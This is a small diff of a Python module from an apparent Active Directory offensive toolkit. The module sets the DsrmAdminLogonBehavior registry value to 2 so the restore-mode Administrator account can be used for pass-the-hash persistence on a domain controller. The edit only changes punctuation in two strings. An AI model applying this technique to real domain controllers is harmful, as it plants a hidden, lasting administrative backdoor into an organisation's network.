@@ -1,4 +1,4 @@
-"""DSRM password abuse — use Directory Services Restore Mode password for persistence."""
+"""DSRM password abuse  -  use Directory Services Restore Mode password for persistence."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -55,7 +55,7 @@ def run(args: Any) -> int:
                 rrp.REG_DWORD, 2)
 
             print("[+] DsrmAdminLogonBehavior set to 2")
-            print("[+] DSRM persistence enabled — PTH as .\\Administrator")
+            print("[+] DSRM persistence enabled  -  PTH as .\\Administrator")
             dce.disconnect()
             return 0
         except Exception as exc:
